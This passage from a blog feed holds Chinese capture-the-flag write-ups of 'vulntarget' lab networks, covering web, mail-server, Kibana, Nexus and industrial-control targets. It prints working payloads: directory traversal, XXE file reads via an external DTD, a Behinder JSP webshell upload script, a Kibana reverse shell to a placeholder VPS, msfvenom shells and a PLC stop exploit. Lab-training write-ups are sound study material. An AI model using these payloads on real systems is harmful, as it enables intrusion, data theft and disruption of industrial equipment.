+    <url>/2023/01/04/vulntarget-j/</url>
+    <content><![CDATA[
+机器密码：
+windows server 2012：workstation&#x2F;admin@20221123、administrator&#x2F;nimda2toor@2102；cms账密：admin&#x2F;admin123
+windows server 2019：test&#x2F;admin@221125；cms账密：admin&#x2F;4n362pR4ExakFab
+拓扑图：
+
+
+信息收集扫描存活主机和端口，发现开放了80、3389、5985、7001端口
+
+访问80端口如下：
+
+5985和7001端口访问都是报404、403
+
+
+漏洞利用这里根据报错可以判断出该网站是FastAdmin搭建的
+
+有注册功能，我们可以尝试一下FastAdmin前台分片传输上传文件getshell，先在前台注册一个普通用户
+
+登陆后在个人资料头像处抓包并上传图片
+
+更改上传数据包，发现无法利用
+
+通过上帝视角也能看到它关闭了分片传输
+
+再尝试会员中心前台getshell，还是在上传修改头像处抓包后修改图片数据（满足图片头格式即可）发现还是无法利用
+
+还有FastAdmin后台getshell，但是这里并不是默认的admin被修改了，扫目录也没啥发现
+再来看看5985和7001端口，其中7001在扫目录时发现存在KindEditor服务
+
+首先访问/kindeditor.js查看版本信息，得知其版本为3.5.5
+
+搜一下相关漏洞发现存在文件上传和遍历目录漏洞，尝试访问一下路径是否存在有必要验证文件upload_json.*和 file_manager_json.*，前面扫目录可知应该是在/php下，发现如下路径可利用
+/php/file_manager_json.php
+
+因为这里没上传点传shell，于是尝试目录遍历，接着试一下列目录
+/php/file_manager_json.php?path=/
+
+
+再访问../发现可以成功读取
+/php/file_manager_json.php?path=../
+
+
+接着再进行读取发现../../被ban了，可通过.././../绕过
+/php/file_manager_json.php?path=.././../
+
+
+这里我们可以看到Fastadmin，通过访问目录/fastadmin/public/得到Fastadmin后台地址FNeSOgYGkp.php
+/php/file_manager_json.php?path=.././../fastadmin/public/
+
+
+然后尝试弱口令admin&#x2F;admin123成功登录后台
+
+于是可以开始尝试后台getshell
+getshell1失败，利用需要用到超级管理员权限，打开菜单规则 &gt; 菜单规则 (auth&#x2F;rule) &gt; 编辑，条件规则处写入
+
+然后创建一个低权限管理员，登录访问后台首页，然而并未被执行
+getshell2失败，后台 &gt; 插件管理 &gt; 如果有文件管理器可直接上传 shell（在线文件管理器要花钱，打扰了再见
+https://github.com/WenchaoLin/Filex（GitHub上翻到一个但是装不上没法用
+getshell3失败，后台 &gt; 插件管理 &gt; 如果有命令执行插件，打开命令执行插件 &gt; 一键生成 API 文档 &gt; 如图
+
+点击生成命令行，然后点击立即执行显示不支持的命令参数
+getshell4失败，后台 &gt; 插件管理 &gt; 在Fastadmin官网去下载一个example 插件压缩包，采用离线安装模式
+打开下载的example插件压缩包，更改Example.php文件中启用插件的地方如下：
+/**    * 插件启用方法    */   public function enable()   &#123;       file_put_contents(&#x27;../public/1.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);       Menu::enable(&#x27;example&#x27;);   &#125;
+
+更改完成，离线上传安装，点击启用插件，会在根目录生成 1.php，然而改完插件就会无法添加
+
+getshell5失败，还有个cve-2021-43117，但是他这后台也没有分类管理功能块
+
+这把Fastadmin的洞都玩了一遍呀😂最后通过上帝视角查看一下版本是1.3.3.20220121，这么新版本要掏day打嘛~ 🐏完还不太舒服再加上元旦就摸了
+后面问crow师傅要了wp得知getshell6的方式，其实就是getshell3那个，利用file_put_contents把内容写入到文件中，安装成功在线命令的插件后发送以下数据包，但是还是不支持的命令参数呀🤡
+POST /FNeSOgYGkp.php/command/command/action/execute HTTP/1.1Host: 192.168.150.145Content-Length: 106Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://test.testAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: sidebar_collapse=0; multiplenav=0; show_submenu=1; PHPSESSID=j98cses8ijabrq4b64a7ev5eup; think_var=zh-cn; uid=2; token=ce525498-a21d-45f1-a45b-e9d27d445131Connection: close commandtype=api&amp;force=0&amp;url=&amp;output=api.php&amp;template=&amp;title=%3C%3Fphp+phpinfo()%3B%3F%3E&amp;author=&amp;language=
+
+
+这里假装成功了（直接上帝之手操作一波略过这里，后面得知可能是我当时没注意下了新版本的插件，得下1.0的插件就可以成功利用，还是自己手法不行
+
+再写入一句话，蚁剑成功连接
+
+但是这里蚁剑有些命令不能执行，估计是有杀软阻止了
+
+内网渗透上传免杀的fscan扫一下内网，发现存在主机10.0.0.222，开放了80、135、445、8000、18000端口
+
+访问8000端口如下：
+
+接着扫目录得到/home路径，发现存在sscms服务，但是报错显示用户中心已被禁用
+
+再来看看18000端口，访问报错403，扫目录得到/license.txt路径，发现存在fckeditor服务
+
+目录拼接得到三个具有上传功能的目录如下：
+/editor/filemanager/connectors/test.html/editor/filemanager/connectors/uploadtest.html/editor/filemanager/browser/default/browser.html
+
+
+
+
+尝试上传冰蝎🐎发现上传失败
+
+
+最后一个上传没反应应该也是不行
+
+接着使用工具Webshell_Generate生成asp的免杀webshell
+
+上传时通过burp抓包查看
+
+再来上传一下其他正常的文件试试，例如txt，发现可以成功上传
+
+接着通过%00进行截断上传，第一次上传后是20230104085427.asp_txt
+
+然后第二次就可以成功上传asp文件
+
+最后蚁剑成功连接
+
+但是这里蚁剑是无法执行命令
+
+于是再利用工具Webshell_Generate生成一个冰蝎的免杀webshell，通过%00进行截断上传，最后冰蝎成功连接
+
+这里就可以成功执行命令，可以得知打了补丁KB4464455
+
+CVE-2020-0787本地提权直接GitHub下载BitsArbitraryFileMoveExploit.exe，不过冰蝎和蚁剑都不能直接上传，就再通过%00进行截断上传，但是运行时报错了，应该是有杀软
+
+查看进程发现开着defender
+
+后面查看官方wp知道可以通过cs免杀wdf上线cs，在桌面发现rdp账密test admin@221125，然后用cs自带的代理成功rdp，最终运行BitsArbitraryFileMoveExploit.exe提权
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-f</title>
+    <url>/2022/12/13/vulntarget-f/</url>
+    <content><![CDATA[
+机器密码：
+外网centos：root&#x2F;vulntarget-f
+内网Ubuntu、二层内网Ubuntu：root&#x2F;Vulntarget#
+拓扑图：
+
+
+准备工作由于外网centos这台机器找不着密码，试了好多个也都不对，于是这里我们重置一下centos的密码
+重启开机，在第一行按e，进行编辑：①.ro改为rw②.在LANG=en_US.UFT-8后面添加init=/bin/sh按Ctrl+X重启进入命令行输入passwd修改密码vi /etc/sysconfig/selinux    # 关闭selinux，它这里就是disable的，所以不需要改动exec /sbin/init        # 重启系统，完成重置密码
+
+后面打的时候发现重置完&#x2F;tmp目录下的都会被清空，会导致无法获取flag，就直接恢复快照后神奇的发现又能扫到目标主机了；然后就是centos这台环境说是有点问题的要根据文档搭一遍，不过我这边恢复快照环境正常没出现问题，有问题可以根据下面文档自行搭建
+
+https://mp.weixin.qq.com/s/t_vxF2EivycI_1WEjunEIg
+
+信息收集扫描存活主机和端口，发现开放了22、443等端口，存在Zimbra
+访问web如下：
+漏洞利用可以利用msf中自带的进行攻击
+
+msf上线后反弹shell，并生成交互式的shell
+python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+
+在root目录下发现flag，但是权限不够无法cat flag，所以需要提权，先信息收集一下
+
+Linux内核提权都试了下并没成功，后面看了下是在/tmp/login_data/root下找到root密码：vulntarget-f
+
+得到flag：vulntarget-f{——dsjlkfj489rjgr—-}
+
+前面就是为了测试一下外网centos是否正常直接利用msf现成的，为了减少对msf的依赖，后面再来手工打一下看看，可以通过xxe与ssrf完成上传webshell
+
+Zimbra的配置文件在/conf/localconfig.xml，里面有保存到一些配置信息的用户名和密码
+
+首先尝试下CVE-2019-9670 XXE漏洞，可以成功读到&#x2F;etc&#x2F;passwd
+poc如下：
+POST /Autodiscover/Autodiscover.xml/ HTTP/1.1Host: 192.168.150.141:7071Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=trueUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 346 &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;    &lt;Request&gt;      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;  &lt;/Autodiscover&gt;
+
+
+然后我们开始构造payload来读取Zimbra的配置文件，其中xml文件需要加上CDATA标签才能作为文本读取，并且xxe不能内部实体进行拼接，所以我们通过kali起个web服务来构造外部dtd，再用前面的那个包请求xml得到密码：XbVaoX3Y
+poc.dtd
+&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;
+
+poc如下：
+POST /Autodiscover/Autodiscover.xml/ HTTP/1.1Host: 192.168.150.141:7071Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=trueUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 404 &lt;!DOCTYPE Autodiscover [        &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.150.128/poc.dtd&quot;&gt;        %dtd;        %all;        ]&gt;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;    &lt;Request&gt;        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;&lt;/Autodiscover&gt;
+
+
+接着利用已经得到的密码获取低权限的token，低权限的token可以通过soap接口发送AuthRequest进行获取，url改为/service/soap或/service/admin/soap，可以返回一个低权限的token
+poc如下：
+POST /service/admin/soap HTTP/1.1Host: 192.168.150.141:7071Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=trueUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 463 &lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;   &lt;soap:Header&gt;       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;       &lt;/context&gt;   &lt;/soap:Header&gt;   &lt;soap:Body&gt;     &lt;AuthRequest xmlns=&quot;urn:zimbraAccount&quot;&gt;        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;        &lt;password&gt;XbVaoX3Y&lt;/password&gt;     &lt;/AuthRequest&gt;   &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; # ZM_AUTH_TOKEN=0_2d4b50e77e5ae4298afd620f5d90d68e61dc8bcf_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303637343037373736323b747970653d363a7a696d6272613b7469643d31303a313836303539373536383b;
+
+
+再通过ssrf漏洞获取proxy接口，访问soap接口来获取到高权限的token
+访问/service/proxy?target=``https://127.0.0.1:8443/service/admin/soap，对其进行抓包，修改为POST，cookie改为得到的低权限token（等级替换为ZM_ADMIN_AUTH_TOKEN），xmlns改为urn:zimbraAdmin
+poc如下：
+POST /service/admin/soap/ HTTP/1.1Host: 192.168.150.141:7071Cookie: ZM_ADMIN_AUTH_TOKEN=0_2d4b50e77e5ae4298afd620f5d90d68e61dc8bcf_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303637343037373736323b747970653d363a7a696d6272613b7469643d31303a313836303539373536383b;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 461 &lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;   &lt;soap:Header&gt;       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;       &lt;/context&gt;   &lt;/soap:Header&gt;   &lt;soap:Body&gt;     &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;        &lt;password&gt;XbVaoX3Y&lt;/password&gt;     &lt;/AuthRequest&gt;   &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; # ZM_ADMIN_AUTH_TOKEN=0_e78154820c9cf010bff124807fd2a5d976753ba1_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303534353633313531323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3239333533313533393b;
+
+
+最后利用高权限的token上传文件从而getshell，这里我们使用python脚本上传webshell，shell路径为/downloads/shell.jsp（访问shell的时候得加上ADMIN_AUTH_TOKEN
+import requests file= &#123;&#x27;filename1&#x27;:(None,&quot;whocare&quot;,None),&#x27;clientFile&#x27;:(&quot;shell.jsp&quot;,r&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;,&quot;text/plain&quot;),&#x27;requestId&#x27;:(None,&quot;12&quot;,None),&#125;   #这里我上传的是一个冰蝎的马headers =&#123;&quot;Cookie&quot;:&quot;ZM_ADMIN_AUTH_TOKEN=0_e78154820c9cf010bff124807fd2a5d976753ba1_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303534353633313531323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3239333533313533393b&quot;,    #修改成上面获取到的的admin_token&quot;Host&quot;:&quot;foo:7071&quot;&#125;r=requests.post(&quot;https://192.168.150.141:7071/service/extension/clientUploader/upload&quot;,files=file,headers=headers,verify=False)   #ip也需要修改print(r.text)
+
+上传成功后通过冰蝎连接，添加cookie请求头，shell路径如下
+https://192.168.150.141:7071/downloads/shell.jsp# 密码：rebeyond
+
+然后和前面的操作就一样了
+内网渗透利用frp建立代理
+./frps -c ./frps.ini
+
+
+./frpc -c ./frpc.ini &amp;
+
+
+上传fscan扫一下内网，发现存在主机192.168.20.129，开放了22、5601、9200、9300端口
+
+
+访问如下，可以得知是kibana
+
+
+横向渗透搜索一下相关漏洞，发现有个CVE-2019-7609 Kibana远程代码执行漏洞
+POC .es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/You_VPS/You_VPS_Port 0&gt;&amp;1\&#x27;&quot;);//&#x27;) .props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;) .es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/You_VPS/You_VPS_Port 0&gt;&amp;1&quot;);process.exit()//&#x27;) .props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)
+
+漏洞复现
+在导航栏中点击Timelion，在文本框中输入如下反弹shell的poc并运行
+# exec括号后面的内容为代码执行.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/192.168.20.128/8888 0&gt;&amp;1\&#x27;&quot;);process.exit()//&#x27;).props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)
+
+
+然后点击左侧导航栏的Canvas，成功接收到shell
+
+或者直接拿**exp**打（没打成功，这里靶场环境存在一些问题
+python2 CVE-2019-7609-kibana-rce.py -u 192.168.20.129:5601 -host 192.168.20.128 -port 8888 --shell
+
+
+然后nc监听8888端口成功连上，进行信息收集一波发现192.168.30.128的网卡
+
+接着尝试Ubuntu内核提权等，最后利用**CVE-2022-0847**在本地编译再上传运行从而成功提权
+首先本地编译好并开启web服务
+./compile.shpython -m http.server 80
+
+再去centos中下载并开启web服务
+wget http://192.168.150.128/exploitpython -m SimpleHTTPServer 80
+
+再来到ubuntu中下载编译好的exp时发现一直没反应，后面会提示是没有权限下载，所以再去tmp目录下进行下载即可成功下载
+cd tmpwget http://192.168.20.128/exploit
+
+执行exp提权，发现报错说我编译的版本太高了
+chmod +x exploit./exploit
+
+
+后面换了个较低版本的Ubuntu18.4的进行编译成功提权，并找到flag：vulntarget{admin&#x2F;top1000.txt}
+
+还有个集成好的提权工具**traitor**可以利用（但是这里我没利用成功
+
+再上传fscan扫一下内网，发现还有个192.168.30.129的网卡开放了22、8081端口
+
+接着上传frp建立代理
+chmod 777 frpc    # 如果用+x这里不知道为啥还是会显示没权限nohup ./frpc -c ./frpc.ini &amp;
+
+访问8081端口如下，可以得知是Nexus 3.21.0-05
+
+搜索其漏洞可以发现可能存在CVE-2020-10199远程代码执行漏洞，但是需要先知道账号密码，弱口令尝试了一下都不行，回头看前面我们得到的flag的内容，可以猜测到这里的账号就是admin，而密码则是top1000中的一个，于是通过burp爆破密码，抓包可以看出这里账号密码是加密的，并且不难看出是base64
+
+于是这里payload设置为base64，并添加top1000字典
+
+爆破出来后base64解出密码：abcdef
+
+登录后抓包获取登录后的cookie及csrf属性
+
+但是后面这里执行命令却不行了
+
+但是它影响版本：Nexus Repository Manager OSS&#x2F;Pro 3.x &lt;&#x3D; 3.21.1，再尝试直接利用**exp**打一下成功了，并找到flag：vulntarget-f{(^^ this__is__flag ^^}
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-g</title>
+    <url>/2022/12/20/vulntarget-g/</url>
+    <content><![CDATA[
+机器密码：
+winxp_HMI：vuln&#x2F;Admin@123.
+winxp_ZJQ：winxp：winXP_ZIJINQIAO
+账号1：Administrator密码1：#xYpo3;W6aS
+账号2：vulntarget密码2：#xYpo3;W6aS
+win7_ForceControl：win7&#x2F;admin
+win7_S7-Client：tegratnluv&#x2F;Vu1Nt@rG3t9Gg
+win7_S7-Server：Vu1NT4r93t&#x2F;welcometoICS
+拓扑图：
+
+
+准备工作这里就按拓朴图中的来修改VMnet的配置，并恢复快照至初始状态，若还有问题可以跟着搭建文档来一遍
+信息收集扫描存活主机和端口，发现开放了80、135、139、445、1234、4322端口
+
+访问80端口报404，如下：
+
+访问1234端口没反应，再访问4322端口还是没反应，毫无思路，这就是工控吗.jpg
+
+1234端口可能对应LAquis的服务，但是这个服务存在web页面，访问并没有存在web页面
+4322端口可能运行 InduSoft Web Studio 的嵌入式HMI软件，存在msf模块可以直接exp，这里我们导入模块,并使用配置好msf攻击模块
+
+漏洞利用InduSoft Web Studio RCE我们直接利用msf来打这个嵌入式HMI软件-InduSoft Web Studio RCE漏洞（一个2011年的工控CVE漏洞）但是第一次没打成功，直接整懵逼了😅
+
+后面把浏览器关闭访问，再执行一次发现可以了但是不会反弹shell（人麻了，这是为什么🥲
+use exploit/windows/scada/indusoft_webstudio_execset rhost 192.168.150.144run
+
+
+最后无脑恢复快照，再尝试几次后突然就又行了🙌
+
+发现192.168.90.40的网卡，于是先上传frp建立代理，发现这是32位的没法用
+meterpreter &gt; upload /root/web/frpc.exemeterpreter &gt; upload /root/web/frpc.inimeterpreter &gt; execute -f frpc.exe -c ./frpc.ini &amp;[-] stdapi_sys_process_execute: Operation failed: is not a valid Win32 application.
+
+所以直接msf添加路由以及sock代理
+run get_local_subnetsrun autoroute -s 192.168.90.0/24run autoroute -puse auxiliary/server/socks_proxy# set srvport 2022run
+
+
+再给kali设置代理
+vim /etc/proxychains4.confsocks5 127.0.0.1 1080
+
+接着扫描一些常见端口，可以发现存活主机192.168.90.110开放了135、139、445端口
+use auxiliary/scanner/portscan/tcpset rhosts 192.168.90.0/24set ports 22,23,80,135,139,445,1433,3306,3389,8080run
+
+
+再使用这个模块来探测，指定该IP扫一下端口发现开放了1234、1235、3389端口
+
+CVE-2017-6020访问1234端口发现存在LAquis服务，而1235端口无法访问，因此我们就只能将1234端口作为突破口
+
+搜索相关漏洞可以发现存在任意文件读取漏洞可利用
+
+
+LAquis SCADA是巴西LCDS公司的一套SCADA（数据采集与监视控制）系统。该系统主要用于对设备进行数据采集和过程控制。4.1.0.4150之前版本的LCDS Laquis SCADA 允许通过打开特制的报告格式文件(.lgx)来执行脚本代码。这可能导致代码执行、数据泄露或系统崩溃
+
+msf如果没有可以先去下载一下漏洞利用脚本并将其放入/usr/share/metasploit-framework/modules/exploits/windows/scada/路径下，便于归类和查找（文件名可以随意修改
+
+打开msf输入如下命令即可
+reload_all
+
+
+
+参数说明：
+DEPTH 到达基本目录的级别，(也就是有多少个..&#x2F;)，如果安装时未更改路径，默认就是向上跳转10级。如果更改路径漏洞利用不成功，可以根据实际情况调整此参数。
+FILE 这是要下载的文件,与上面的DEPTH参数结合组成完整的文件路径。
+Proxies 端口[，类型：主机：端口] […]的代理链
+RHOSTS 目标主机，范围CIDR标识符或具有语法’file：‘的主机文件
+RPORT 目标端口（TCP），软件默认安装是1234，不排除更改的可能。
+SSL 协商出站连接的SSL &#x2F; TLS
+VHOST HTTP服务器虚拟主机
+
+这里我们只需要修改file和rhost这两个参数即可（其中file文件路径可在之前的session中桌面的工作日记.md（前面msf中也下不了这个中文文件，不过可以传个🐎用蚁剑或者cs连上下载文件）中找到关键信息位于C:\document\information.txt
+
+use exploit/windows/scada/LAquis_cve_2017_6020set file document/information.txtset rhosts 192.168.90.110
+
+run一下即可得到文件
+
+查看发现kali中会乱码，应该是编码问题，拖到Windows下就正常了，得到了一些主机的账密
+
+这里的主机1应该就是前面打的那个奇怪的嵌入式HMI软件-InduSoft Web Studio的机子，而主机2应该就是现在打的这台，尝试3389成功进入，并且发现还存在192.168.95.66的网卡
+
+CNVD-2020-31508在桌面还发现有个ProgMan的软件，找到文件位置可以看到他的版本信息是6.5，是个紫金桥的工程管理器
+
+搜一下相关漏洞发现有DLL劫持漏洞（一开始搜ProgMan没找到🤐
+
+准备工作：上传procexp.exe（现在的v17版本在winxp中用不了，可以去其他站点下载低版本的就支持winxp）与dllinject.exe（同样需要去其他站点下个老版本的才能用）文件，上传文件需要换成Windows下rdp进行传输，并按照下图配置后连接rdp即可成功复制粘贴进去
+
+接着寻找可劫持进程ProgMan.exe的dll，利用msf基于dll劫持实现提权
+1.开启进程ProgMan.exe，用procexp.exe查看进程加载的dll
+
+2.与注册表项进行对比
+
+3.利用msfvenom指令创建反弹shell的dll文件，使用正向连接并将其上传
+msfvenom -p windows/meterpreter/bind_tcp LPORT=1234 -f dll &gt; ws2help.dll
+
+
+4.利用msf中的handler模块开启监听
+use exploit/multi/handler set payload windows/meterpreter/bind_tcpset rhost 192.168.90.110set lport 1234
+
+5.利用DllInject.exe将ws2help.dll注入到进程
+
+6.注入后msf成功上线，但是我这里尝试了一波都没反应的🤡在procexp中查看发现已经注入了呀 后面说是重启一下靶机就可以成功上线实现提权（不过我一直没成功😴
+IDA动态调试力控软件前面我们还有个主机3的账密没用到，于是我们就再扫一下发现存活两台主机192.168.95.100和192.168.95.110
+use auxiliary/scanner/portscan/tcpset rhosts 192.168.95.0/24set ports 22,23,80,135,139,445,1433,3306,3389,8080
+
+
+尝试一下可知主机3是192.168.95.110
+
+并且根据前面得到的提示我们需要在力控软件中找到密码
+
+终于来到这里了，可是却没有得到主机4的账户密码，但是根据可靠消息得知，主机4的账户、密码可能在力控软件的用户信息里，你能找到他吗？
+
+接着在功能 - 用户管理中找到个系统管理员级的用户tegratnluv，但是密码看不了
+
+不过这里有修改功能，我们可以通过修改密码在后面加个test保存然后IDA动态调试找到密码对应的hex（需要以管理员打开IDA，不然后面调试不了该进程）
+
+接着调试进程，点击Debugger - Attach - Local Windows debugger选择指定进程如下：
+
+然后按alt+b调出搜索，搜索对应的hex即可（这里需要注意要改个不常见的字符串，不然像我这test有一堆🥲
+
+不过第一个就成功找到密码：Vu1Nt@rG3t9Gg
+
+西门子S7-300启停攻击根据前面得到的账密成功连接rdp，发现开着个S7COMM的客户端模拟器，确定是上位机（没开防火墙
+
+并发现还存在网卡172.16.1.37
+
+于是我们用msf做个正向马并上传
+msfvenom -p windows/meterpreter/bind_tcp lport=4444 -f exe &gt; test.exe
+
+
+开启监听成功上线
+use exploit/multi/handler set payload windows/meterpreter/bind_tcpset rhost 192.168.95.100set lport 4444
+
+
+接着找到下位机的主机172.16.1.3
+
+再设置一下自动路由
+run post/multi/manage/autoroute
+
+
+接下来的操作就不是很懂了，这个不是可以直接点stop停止吗😂说明未授权？
+这里我们在上位机中可以看到S7的服务端正在运行，我们的目的就是要把下位机打停机
+
+然后使用ISF来进行攻击，已知这时S7-300的模拟器，ISF中存在这一型号的利用模块可以直接利用，ISF的工程项目，输入如下命令即可成功让其停止工作
+python2 isf.pyuse exploits/plcs/siemens/s7_300_400_plc_controlset target 172.16.1.3
+
+
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+        <tag>工控</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-k</title>
+    <url>/2023/01/13/vulntarget-k/</url>
+    <content><![CDATA[
+机器密码：
+xxl-job-admin：xxl-job&#x2F;root123；admin&#x2F;Bolean@10000
+nacos-springcloudgateway：spring-nacos&#x2F;root123；nacos&#x2F;bolean@1q2
+redis：redis&#x2F;redis@1z；redis密码：nbsg@123456
+拓扑图：
+
+
+准备工作修改一下xxl-job的网卡
+sudo ifconfig ens33 192.168.150.11/24 up
+
+
+或者修改网络配置文件
+sudo vim /etc/netplan/00-installer-config.yamlsudo netplan apply
+
+
+信息收集扫描存活主机和端口，发现开放了22、8080、8081、9999端口
+
+访问8080、8081端口报错404
+
+9999端口报错500，后面根据搜索报错信息确认是xxl-job服务，存在xxl-job RCE未授权远程命令执行
+&#123;&quot;code&quot;:500,&quot;msg&quot;:&quot;invalid request, HttpMethod not support.&quot;&#125;
+
+
+
+漏洞利用xxl-jobpayload如下：
+POST /run HTTP/1.1Host: 192.168.150.11:9999User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 356 &#123;  &quot;jobId&quot;: 1,    // 任务ID  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,    // 任务标识  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,    // 任务参数  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,    // 任务阻塞策略，可选值参考com.xxl.job.core.enums.ExecutorBlockStrategyEnum  &quot;executorTimeout&quot;: 0,     // 任务超时时间，单位秒，大于零时生效  &quot;logId&quot;: 1,        // 本次调度日志ID  &quot;logDateTime&quot;: 1586629003729,        // 本次调度日志时间  &quot;glueType&quot;: 